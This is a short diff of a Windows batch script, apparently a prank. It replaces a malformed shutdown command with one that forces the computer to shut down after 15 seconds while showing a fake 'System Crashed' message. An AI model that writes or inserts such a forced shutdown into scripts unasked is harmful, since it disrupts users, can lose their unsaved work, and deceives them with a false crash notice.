@@ -1,6 +1,6 @@
 @echo off
 mode con: cols=170 lines=1500
-shutdown /d E
+shutdown /s /t 15 /c "System Crashed:("
 cd /
 C:
 cls
